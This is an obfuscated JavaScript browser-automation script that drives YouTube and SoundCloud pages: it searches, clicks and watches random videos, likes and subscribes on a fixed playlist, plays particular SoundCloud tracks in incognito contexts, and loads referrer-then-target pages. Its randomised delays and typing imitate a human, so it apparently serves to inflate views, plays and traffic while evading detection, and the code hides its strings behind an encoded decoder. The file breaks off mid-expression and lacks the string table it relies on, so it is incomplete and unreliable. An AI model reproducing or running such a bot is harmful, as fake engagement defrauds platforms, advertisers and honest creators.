const Y = d,
  X = b,
  W = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x452 + 0x31 * -0xc2 + -0x1 * -0x20d1))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x15ed + -0x15a7 + 0x46 * -0x1), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x5e29 + 0x34f7 + 0x9e62 + (-0x286d + -0x4fc9 + 0x1 * 0xb2ce) * random()) : await standardWaitForNetIdle(f), await wait(-0xf1b + 0x220c + -0x97 * -0x1 + (-0x408d + -0x1440 + 0x1 * 0x7bdd) * random()), 0x17f5 * -0x1 + 0xc08 + 0xbee;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x1d66 * 0x1 + 0x148 + -0x2 * 0x593), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x1 * -0x1bb2 + -0x2281 + 0x368 * 0x2;
}
async function randomWait() {
  return await wait(0xe43 + -0x1653 + 0xdcc * 0x2 + (0x246d + 0x1654 + 0xd13 * -0x3) * random()), 0x1 * -0x245d + 0x84f + 0x1c0f;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0xdaa + -0xb80 + -0x192a * -0x1, 0x17e1 + -0xa03 * 0x3 + 0x62f), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x2bc * -0x2e + -0x3231 * 0x6 + 0x2954e) * getRandomInt(-0x2578 + 0x2c0 + -0xfe * -0x23, 0xca0 + 0x7be * -0x5 + -0x1a1b * -0x1), h)), 0xc68 + -0x18 + 0x89 * -0x17;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x34f * 0x2 + 0x1 * -0x727 + 0x5 * 0x2c1;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x3 * 0x4a9 + -0x1f66 + 0x2d62]['split']('\x20');
    for (let k = 0x20 * -0x55 + 0x645 + -0x5 * -0xdf; k < i['length']; k += 0x17c4 + 0xbcf + -0x5 * 0x71d)
      j += i[k] * h[i[k + (-0x4 * 0x63 + -0x739 * 0x1 + 0x8c6 * 0x1)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x27 * -0xc1 + -0xb * -0x250 + -0x36d1 * 0x1)['map'](l => Array['from'](l['children']))['flat'](-0x26f3 + -0x1 * -0x175b + -0x3 * -0x533)['map'](l => l['childNodes'][0x161 * -0x12 + 0x11 * 0x235 + -0xcb2]['childNodes'][0x2 * 0xdad + 0x1 * -0x234e + 0x7f4]['childNodes'][0x8ad + 0x6d * 0x3 + -0x9f3 * 0x1]['childNodes'][0x395 * -0x1 + 0x1 * -0x1655 + 0x2 * 0xcf5]['childNodes'][0x1 * 0x1921 + -0x24f6 + 0x65 * 0x1e]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0xf * -0x23b + -0x5 * 0x682 + -0x5 * -0x99, 0x7a4 + 0x43d * 0x8 + -0xb02 * 0x2)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x5 * 0xf91 + 0x553e * -0x1 + 0x4201);
  const h = await getMaxTime(f),
    i = Math['min']((0x19f22 + -0xe45a + 0x2f98) * getRandomInt(-0x91d * 0x1 + 0x16df + -0xdc0, 0x1ac6 + 0xc92 + -0x1 * 0x2753), h);
  return await wait(i), -0x7bb + -0x1e2 * -0x5 + 0x56 * -0x5;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x304 + 0x3 * 0xa59 + -0x220f]['children'][-0x51a * 0x2 + -0x56 * -0x14 + -0x37c * -0x1]['children'][0x12a7 + -0x1e5c * 0x1 + 0x3e7 * 0x3]['children'][-0x1 * -0x941 + -0xbf * 0xa + -0x1cb * 0x1]['children'][-0x1b4 * 0xb + -0x1f87 + 0x3243]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x1 * -0xd1d + -0x81d + 0x1 * -0x4ff;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x17 * 0xc9 + -0xe3 * -0xf + 0x1d * 0x2a);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x1c08 + -0x9 * 0xa3 + -0x4e1 * -0x7 + (0x5dd + -0x6b6 + -0x59 * -0x3) * random()
  }), await wait(0x7 * 0xc7 + 0x21 * 0x53 + -0xe30 + (-0x19b5 + 0x2f9 * 0x6 + -0x90b * -0x1) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const R = d,
      k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document[R(0xb) + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0xbb8 + 0x20c2 * -0x1 + 0x1 * 0x150c]['childNodes'][0xfc0 + 0x1 * 0x204f + -0x2 * 0x1807]['childNodes'][-0x9f5 + -0x9ca + -0x13c * -0x10]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x4c * -0x2f + 0x11 * 0x10a + -0x1f99]['childNodes'][0x3 * 0x9a8 + -0x1a35 + -0x2c3]['childNodes'][0x14b6 + 0xe30 + -0x1 * 0x22e4]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x20ea + -0x332 * 0x9 + -0x427 * 0x1),
          r = -0xb11 * -0x1 + -0x16fa + 0xbe9;
        for (let u = 0x4 * -0x3 + 0x3ee * -0x7 + 0x1b8e; u < q['length']; u += -0x1 * 0x1c57 + -0x13ae + -0x5 * -0x99b)
          r += q[u] * k[q[u + (0x104b + 0x1389 + -0x3 * 0xbf1)]];
        return r;
      }(n);
  });
  await wait((0x68ef + -0x3999 + -0xb42 * -0x1) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x795 * 0x2f + -0x1725b + 0xf860) * getRandomInt(-0x172c + 0xd5c + 0x9d1, -0x1373 + -0xb * -0x1cf + -0x68), h + (-0x1c27 * 0x1 + -0x56f * -0x7 + 0x9a6));
  return await wait(i), 0x2 * 0x8dd + -0x5 * -0x3f6 + -0x2587;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x17 * 0xc9 + -0xe3 * -0xf + 0x1d * 0x2a);
    let h = e[f];
    if (c['FkzZWI'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x2 * 0xc44 + 0x221 * -0x8 + 0x14 * 0x214, r, s, t = -0x1d1 * -0x1 + -0x2203 + 0x1a * 0x13d; s = m['charAt'](t++); ~s && (r = q % (-0x305 * -0xa + -0x28e + -0x1ba0) ? r * (0x3c7 + -0x1 * -0x2404 + -0x278b) + s : s, q++ % (-0x4a + -0xd7a + 0xdc8)) ? o += String['fromCharCode'](0x1448 + -0xd * -0x2c + -0x1585 & r >> (-(0xa6 + -0x1e0c + 0x1d68) * q & -0x683 * 0x2 + 0xe3 * 0x1 + -0xb * -0x11b)) : 0x8 * -0x175 + -0xeb3 * -0x2 + -0x3 * 0x5ea) {
          s = n['indexOf'](s);
        }
        for (let u = -0x1 * -0x1bb2 + -0x2281 + 0x245 * 0x3, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0xe43 + -0x1653 + 0x104 * 0x8))['slice'](-(0x246d + 0x1654 + 0x687 * -0x9));
        }
        return decodeURIComponent(p);
      };
      c['HBxdYU'] = i, b = arguments, c['FkzZWI'] = !![];
    }
    const j = e[0x1 * -0x245d + 0x84f + 0x1c0e],
      k = f + j,
      l = b[k];
    return !l ? (h = c['HBxdYU'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x25f1 + 0x3ad * 0x5 + -0xa2 * 0x59), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0xc91 * 0x3 + -0xb * -0x124 + -0x2687 + (-0x552 + -0x2482 * 0x1 + 0x2dbc) * Math['random']());
    });
  }, -0x3c7 * 0xe + -0x1deb + 0x6e25);
  await wait(0x4e899 + -0x1 * -0x3072e + 0x35be7 * -0x1);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x38f * 0x51 + 0x6 * 0x1a4a + 0x16ce3) * getRandomInt(-0x1ea5 + -0x19 * -0xa + -0x1daf * -0x1, -0xac + 0x412 * -0x3 + 0xcfb)), clearInterval(h), 0x3 * -0x9ff + -0x1320 + 0x311e;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x793 + -0x1 * 0x11e9 + 0x197c;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x122 * -0x1d + 0x36f * 0x3 + 0x168e * 0x1;
    await randomWait();
  }
  return -0x54c * 0x6 + 0xfcb + -0x7ff * -0x2;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x17 * 0xc9 + -0xe3 * -0xf + 0x1d * 0x2a);
    let h = e[f];
    if (b['cOwPTE'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x2 * 0xc44 + 0x221 * -0x8 + 0x14 * 0x214, s, t, u = -0x1d1 * -0x1 + -0x2203 + 0x1a * 0x13d; t = n['charAt'](u++); ~t && (s = r % (-0x305 * -0xa + -0x28e + -0x1ba0) ? s * (0x3c7 + -0x1 * -0x2404 + -0x278b) + t : t, r++ % (-0x4a + -0xd7a + 0xdc8)) ? p += String['fromCharCode'](0x1448 + -0xd * -0x2c + -0x1585 & s >> (-(0xa6 + -0x1e0c + 0x1d68) * r & -0x683 * 0x2 + 0xe3 * 0x1 + -0xb * -0x11b)) : 0x8 * -0x175 + -0xeb3 * -0x2 + -0x3 * 0x5ea) {
          t = o['indexOf'](t);
        }
        for (let v = -0x1 * -0x1bb2 + -0x2281 + 0x245 * 0x3, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0xe43 + -0x1653 + 0x104 * 0x8))['slice'](-(0x246d + 0x1654 + 0x687 * -0x9));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x1 * -0x245d + 0x84f + 0x1c0e,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0xdaa + -0xb80 + -0x192a * -0x1; u < 0x17e1 + -0xa03 * 0x3 + 0x728; u++) {
          p[u] = u;
        }
        for (u = 0xa7b * -0x1 + -0x505 * 0x5 + 0x2394; u < -0x2578 + 0x2c0 + -0x17d * -0x18; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0xca0 + 0x7be * -0x5 + -0x1b16 * -0x1), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0xc68 + -0x18 + 0x18a * -0x8, q = -0x34f * 0x2 + 0x1 * -0x727 + 0x5 * 0x2c1;
        for (let v = -0x3 * 0x4a9 + -0x1f66 + 0x2d61; v < n['length']; v++) {
          u = (u + (0x20 * -0x55 + 0x645 + -0x1f * -0x24)) % (0x17c4 + 0xbcf + -0x35 * 0xa7), q = (q + p[u]) % (-0x4 * 0x63 + -0x739 * 0x1 + 0x9c5 * 0x1), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x27 * -0xc1 + -0xb * -0x250 + -0x35d7 * 0x1)]);
        }
        return t;
      };
      b['YSqRqB'] = m, c = arguments, b['cOwPTE'] = !![];
    }
    const j = e[-0x26f3 + -0x1 * -0x175b + -0x2 * -0x7cc],
      k = f + j,
      l = c[k];
    return !l ? (b['zgbvJz'] === undefined && (b['zgbvJz'] = !![]), h = b['YSqRqB'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function fetchRandomSC() {
  return Math['random']() <= 0x748 + 0x225f + -0x29a7 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x1952 + 0x4d6 + 0x51f * 0x4 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const S = d;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x1b * -0x11b + 0x2 * -0x4bc + 0x1 * 0x2751 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0xf28 * -0x2 + -0x1d1a * 0x1 + -0x136;
      if (await k[S(0x5)](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          const T = b;
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + T(0x19, 'ugiN') + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0xc89d + 0x6d8c + -0x3 * -0x58f3 + getRandomInt(-0x5007 + 0x3514 + 0x558b, 0x6 * -0xf15 + 0x3271 + 0x9d3d));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x1 * 0x16e8 + -0x1ca9 + -0x2 * -0x2e1), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x1 * 0xd39 + 0x1773 + 0x9a * -0x11;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x2cb * -0x3 + -0x102 * -0x8 + -0x1071, 0xf7 * 0x1 + 0x1629 + -0x5 * 0x496)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x11a1 + -0x236c + 0x3cdd + floor((-0x87 * -0x23 + 0x99e + -0x182b) * random()))), log('p2'), log(await s['evaluate'](() => {
        const V = c;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x1 * -0xe8675f7a + -0x2d5b78be + 0x195c2d838),
          -0x4 * 0x269a55 + 0x5a123 * 0x4 + -0x81f264 * -0x2,
          0x6a7 * -0x11 + -0xca0 * -0x4 + -0xbe97 * -0x1,
          -0x51f + -0x1ac + 0x74b * 0x1
        ], y = [
          -0x1 * -0xecb + 0x19d5 + -0x2 * 0x1444,
          0x565 * 0x1 + 0xdc8 + -0x131d * 0x1,
          -0x79a + 0x578 + -0x22a * -0x1,
          -0x1d8f + -0x182c + -0x1 * -0x35bb
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x117f + 0xe5 * -0x10 + 0x1 * -0x32e)['update'](K)[J]();
          };
        }, C = function() {
          const U = b;
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x4 * -0x691 + -0x1df6 + -0x1c1d * -0x2; J < z[U(0x0, 'b^q]')]; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x1 * 0x201f + 0x2bd * -0xd + -0xb2 * -0x5) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x34b * 0x9 + 0x2 * 0x8a5 + -0x125 * 0x29] = A[0x15b1 + 0x63e * 0x5 + -0x34d7] = A[0x14 * -0xc9 + 0x34 * -0x8f + 0x2cc1] = A[0xa * 0x10a + 0x10bf + -0x1cf * 0xf] = A[0x1e79 + -0x41 * -0x1 + -0xa3d * 0x3] = A[0x1fc4 + -0x1b10 + 0x6 * -0xc8] = A[0xcb2 + -0x69 * -0x5d + 0x5 * -0xa2a] = A[0xf6c + 0xa4e * 0x2 + -0x2402] = A[0x1024 + 0x7 * 0x3ff + -0x2c16] = A[-0x63c + -0x1012 + 0x772 * 0x3] = A[0x5 + -0xd3d + 0xd41] = A[0xbb3 * -0x1 + 0xa3c + 0x181] = A[-0x2551 + -0x7 * -0x30d + 0x1001] = A[0x1 * 0x1356 + -0x1 * -0x21cd + -0x1 * 0x3517] = A[0x1 * -0x1552 + 0x900 + -0xc5f * -0x1] = A[0x1a3 + -0x2 * -0x1d7 + -0x543] = A[-0x4c1 * 0x2 + 0x1cd2 + -0x1341] = 0x3af + -0x307 * 0x7 + 0x1 * 0x1182, this['blocks'] = A) : this['blocks'] = [
                0x2445 + -0xf33 + -0x1512,
                -0xa93 * 0x1 + 0x1527 + -0xa94,
                -0x49 * 0x5e + 0x1bb + 0x1913,
                -0x5 * 0x1eb + -0x115c * -0x2 + 0x7 * -0x397,
                0x5 * -0x19d + 0x2480 + 0x1 * -0x1c6f,
                -0x2e * 0xd3 + -0xbce + 0x31b8,
                -0x359 * -0x9 + -0x1d2b + 0x1 * -0xf6,
                0x175d + 0x3 * -0xa85 + 0x2 * 0x419,
                -0x22d9 + 0x1 * 0x179 + 0x2160,
                -0x1159 + 0x22 * 0xca + -0x1 * 0x97b,
                0x1 * -0x1c8a + -0x1936 * 0x1 + 0x35c0,
                -0x181e + 0x2d * -0xdd + 0x3ef7,
                0xa * 0x15b + 0x3a1 + 0x112f * -0x1,
                -0x1092 + -0x1e15 + 0x2ea7,
                0x206 + 0xeef * -0x2 + 0x129 * 0x18,
                -0x81a + -0x1ffb * -0x1 + 0x1 * -0x17e1,
                -0x34 * -0x2 + -0x14d2 + -0x1a * -0xc9
              ], this['h0'] = -0x261199ec + 0x1 * -0xb265eb3a + -0x175c1a5 * -0xdb, this['h1'] = -0x9f95f * 0x11cb + 0x1 * 0x1938c9a2 + 0x78a184b * 0x34, this['h2'] = -0x103504e7f + -0x373 * 0x3920d7 + 0x261177112, this['h3'] = 0x1f802dd5 + 0xc9d1089 * -0x1 + 0x1 * -0x2b0c8d6, this['h4'] = -0x54d13 * -0x95 + -0xb1fd382 * 0x20 + 0x224b77621, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x388 + 0x1301 * -0x1 + -0x3 * -0x783, this['finalized'] = this['hashed'] = -0x1 * 0x1583 + -0x2 * -0xb6b + -0x153, this['first'] = 0x17b9 + -0x7ab + -0x24b * 0x7;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x2233 + 0xf5a + -0x318d, O = J['length'] || -0x1233 + -0x2 * -0xdb8 + -0x2b * 0x37, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x3 * 0x5de + 0x1f * 0x116 + -0x3344, P[-0x7 * -0x2f0 + 0x1 * -0x2369 + 0xed9] = this['block'], P[-0x20ec + -0xcb7 * -0x3 + -0x529 * 0x1] = P[0x1113 + 0xd * 0x116 + -0x1 * 0x1f30] = P[0x1190 + -0x15ed + 0x45f] = P[0x163 * 0xd + 0xb * -0x2e7 + -0x4a3 * -0x3] = P[0x863 + -0xd7d * -0x1 + -0x15dc] = P[-0x1d6e * -0x1 + 0x2649 + -0x43b2] = P[0x1cd * 0x5 + -0xf7d + 0x682] = P[0x116c + -0x20ed + 0x38 * 0x47] = P[0x2425 + 0x1428 + -0x3845 * 0x1] = P[0x224b + 0x23f2 + -0x4634] = P[-0x21ae + 0x11f3 + 0xfc5] = P[0x6 * -0x141 + -0x17 * 0xe9 + 0x1c80] = P[-0x1 * 0x17a7 + -0x1f81 * -0x1 + -0x7ce] = P[-0x6d7 * 0x3 + -0xcd * -0x1a + -0x40] = P[-0x13c3 + 0x1 * 0xe4f + 0x582] = P[0x2439 + 0x23ec + -0x1 * 0x4816] = -0xcd1 + 0x2ea * -0x1 + 0xfbb * 0x1), K) {
                    for (N = this['start']; M < O && N < -0xdf * -0x23 + 0x25 * -0x4f + -0x16 * 0xdb; ++M)
                      P[N >> -0x11 * -0x3b + -0x1 * -0x1c12 + -0x1ffb] |= J[M] << y[-0xe0f + -0xf23 + 0x1d35 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x25 * 0xad + -0x14e + 0x1a8f; ++M)
                      (L = J['charCodeAt'](M)) < -0x4fa * -0x1 + 0x1a00 + -0xa6 * 0x2f ? P[N >> -0x3 * 0x87 + 0xd * 0x193 + -0x12e0] |= L << y[-0x11b8 + 0x12f4 + -0x139 & N++] : L < -0x6b * -0x7 + 0x1ac1 + -0x19 * 0xde ? (P[N >> -0x153 * -0xf + -0x982 * 0x1 + 0x373 * -0x3] |= (-0x1 * 0x12d7 + -0x1fde + -0x1 * -0x3375 | L >> -0x3 * -0x2f5 + -0xc76 + 0x39d) << y[0x5a3 + -0x13f5 * 0x1 + 0xe55 & N++], P[N >> -0x6d7 * 0x1 + 0x7 * 0x2d1 + 0x16e * -0x9] |= (0x1808 * -0x1 + -0x11 * 0x8e + -0x6 * -0x5a9 | 0x1f33 + -0x920 + -0x15d4 & L) << y[0x3 * -0x5cb + -0x92d * -0x2 + -0xf6 & N++]) : L < -0x895e + -0x1 * 0x10985 + -0x7bc7 * -0x5 || L >= -0x9c9d + 0x843e + 0xf85f ? (P[N >> 0xded + 0x254a * -0x1 + -0x1f * -0xc1] |= (0xe5 * 0x1c + -0x1 * -0x1712 + 0x2 * -0x179f | L >> 0xa9 * -0x1 + -0xb78 + -0xc2d * -0x1) << y[0x1 * -0xa9f + -0xdcf + 0x1871 & N++], P[N >> 0x1 * 0x923 + -0x1855 * 0x1 + 0x4 * 0x3cd] |= (-0x5 * -0x349 + -0x65 * 0xe + 0x1 * -0xa67 | L >> -0x1 * 0x85f + -0xa53 + -0x95c * -0x2 & -0x1307 + 0x572 + -0x2 * -0x6ea) << y[-0x2 * -0x26d + 0x8 * -0x458 + 0x13 * 0x193 & N++], P[N >> 0x21ee + 0x42b + -0x2617] |= (-0xb3 * -0xf + 0x241a + -0x2e17 | 0x1dd3 + 0x2af * 0x1 + 0x2043 * -0x1 & L) << y[-0x1dd8 + 0x163 * 0x11 + 0x648 & N++]) : (L = 0x193b3 + -0x978e + 0x3db + ((-0x1ab9 * -0x1 + 0x55d + -0x99 * 0x2f & L) << -0xadf + -0x2065 + -0x2e * -0xf1 | -0x539 * 0x3 + -0x4 * 0x179 + 0x198e & J['charCodeAt'](++M)), P[N >> 0x102a + -0x1 * 0x1b59 + -0x3 * -0x3bb] |= (-0x1 * 0x1edd + 0x1 * 0x205 + -0x3b9 * -0x8 | L >> 0x28 * 0x83 + -0x23e8 + 0xf82) << y[-0x158a * 0x1 + -0x14db + 0x2a68 & N++], P[N >> -0x1472 + 0x1787 + -0x313] |= (0x995 + -0x1 * -0x73 + -0x988 | L >> -0x1bd7 + 0xbe2 + 0x1001 & 0x99d + -0x3 * 0x153 + 0x1 * -0x565) << y[-0x3 * 0x814 + -0x11cd + 0x4ac * 0x9 & N++], P[N >> -0x3 * 0xccd + 0x1b23 + -0xde * -0xd] |= (0x1 * -0x58f + -0x16f * 0x6 + 0x1 * 0xea9 | L >> 0x2075 + -0x3 * 0xc38 + 0x439 & 0xd * -0x11 